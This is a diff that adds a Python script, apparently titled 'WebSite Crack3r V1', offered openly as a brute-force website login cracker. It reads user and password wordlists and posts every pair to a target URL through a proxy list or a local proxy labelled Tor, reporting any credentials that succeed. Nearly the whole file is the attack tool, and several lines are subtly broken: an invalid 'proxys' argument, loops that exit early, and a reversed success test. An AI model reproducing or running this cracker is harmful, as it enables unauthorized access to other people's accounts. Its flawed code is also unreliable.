@@ -1,0 +1,92 @@
+import requests
+from colorama import Fore as C  
+from colorama import *
+import time
+import os , sys
+os.system('cls')
+print(Back.BLACK+Fore.CYAN+Style.BRIGHT+"""
+
+ ██████╗██████╗  █████╗  ██████╗██╗  ██╗██████╗ ██████╗     ███████╗██╗████████╗██████╗ 
+██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝╚════██╗██╔══██╗    ██╔════╝██║╚══██╔══╝╚════██╗
+██║     ██████╔╝███████║██║     █████╔╝  █████╔╝██████╔╝    ███████╗██║   ██║    █████╔╝
+██║     ██╔══██╗██╔══██║██║     ██╔═██╗  ╚═══██╗██╔══██╗    ╚════██║██║   ██║    ╚═══██╗
+╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗██████╔╝██║  ██║    ███████║██║   ██║   ██████╔╝
+ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝   ╚═╝   ╚═════╝ 
+------------------------------------------------------       
+[+] WebSite Crack3r V1
+[+] Coded By Elf : Cybery
+[+] Telegram : @Elf_Security_Cyber                                
+------------------------------------------------------
+""")
+
+
+
+class cracker():
+  def proxy_list():
+     url = input(Back.BLACK+C.RED+"[1]3nt3r 7h3 Ur1 Sit3 : ")
+     prox = input(Back.BLACK+C.YELLOW+"[2]3nt3r 7h3 N2m3 Fi13 Proxy List : ")
+     pass_list= input(C.CYAN+Style.BRIGHT+Back.BLACK+"[3]3nt3r 7h3 N2m3 Fi13 P2ss 1ist Fi13 : ")
+     user_list = input(C.CYAN+Style.BRIGHT+Back.BLACK+"[4]3nt3r 7h3 N2m3 Fi13 Us3r 1ist Fi13 : ")
+     text = open(pass_list)
+     text2 = open(user_list)
+     t = 0
+     proxy = open(prox)
+     
+     for pro in proxy:
+         for i in text:
+           for u in text2:
+             a = time.strftime("%H:%M:%S")   
+             Time = f"{C.RED}[{C.WHITE}{a}{C.RED}]"
+             data = {"user":u , "password":i}
+             req = requests.post(url ,data=data , proxys=pro)
+             t += 1
+             if "Login" in req.text:
+                 
+                 print (str(t)+")")
+                 
+                 print (f"{Time}{C.GREEN}PASSWORD IS : {C.YELLOW}{i} ")
+                 print (f"{Time}{C.GREEN}USER IS : {C.YELLOW}{u} ")
+                 sys.exit()
+             else:
+                  time.sleep(1)
+                  print (Back.BLACK+f"{Time}{C.YELLOW}Send Attack Burt Fores To Url :{C.GREEN} {url}{C.RED} |{C.CYAN} {t}){C.RED} Not Found {u} & {i} | Proxy {pro}")
+                  break
+           break
+         
+  def tor():
+     url = input("[1]3nt3r 7h3 Ur1 Sit3 : ")
+     pro = "https://127.0.0.1:8080"
+     pass_list= input("[2]3nt3r 7h3 N2m3 Fi13 P2ss 1ist Fi13 : ")
+     user_list = input("[3]3nt3r 7h3 N2m3 Fi13 Us3r 1ist Fi13 : ")
+     text = open(pass_list)
+     text2 = open(user_list)
+     t = 0
+    
+     for i in text:
+         for u in text2:
+             data = {"user":u , "password":i}
+             req = requests.post(url, data=data , proxys=pro)
+             t += 1
+             a = time.strftime("%H:%M:%S")   
+             Time = f"{C.RED}[{C.WHITE}{a}{C.RED}]"
+             if "Login" in req.text:
+
+                  print (str(t)+")")
+
+                  print (f"{C.GREEN}PASSWORD IS : {C.YELLOW}{i} ")
+                  print (f"{C.GREEN}USER IS : {C.YELLOW}{u} ")
+                  sys.exit()
+             else:
+                 print (Back.BLACK+f"{Time}{C.YELLOW}Send Attack Burt Fores To Url :{C.GREEN} {url}{C.RED} |{C.CYAN} {t}){C.RED} Not Pass User : {u}&{i} ")
+
+
+def if_1():
+         print(f"{C.WHITE}{Back.BLACK}-----------------------------------")
+         if input(C.CYAN+Style.DIM+"Pr0xy 1ist 0r T0r? : " ) in ("tor"):
+
+            
+            cracker.tor()
+         else:
+            cracker.proxy_list()
+if_1()
+
